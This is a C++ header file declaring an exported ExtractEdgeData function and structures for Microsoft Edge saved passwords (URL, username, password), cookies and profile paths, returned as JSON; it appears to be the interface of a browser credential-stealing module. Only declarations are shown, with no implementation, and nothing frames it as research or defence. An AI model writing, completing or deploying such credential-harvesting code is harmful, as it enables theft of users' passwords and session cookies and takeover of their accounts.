#pragma once

#include <string>
#include <vector>
#include <cstdint>

// Microsoft Edge browser data extraction functions

/**
 * Extract Microsoft Edge browser data including passwords and cookies
 * @return JSON string containing extracted data
 */
extern "C" const char* ExtractEdgeData();

/**
 * Edge password structure (same as Chrome since Edge is Chromium-based)
 */
struct EdgePassword {
    std::string url;
    std::string username;
    std::string password;
};

/**
 * Edge cookie structure
 */
struct EdgeCookie {
    std::string host;
    std::string name;
    std::string value;
    std::string path;
    bool secure;
    bool httponly;
};

/**
 * Edge profile structure
 */
struct EdgeProfile {
    std::wstring name;
    std::wstring path;
};

/**
 * Escape JSON special characters
 * @param str Input string
 * @return Escaped string safe for JSON
 */
std::string EscapeJson(const std::string& str);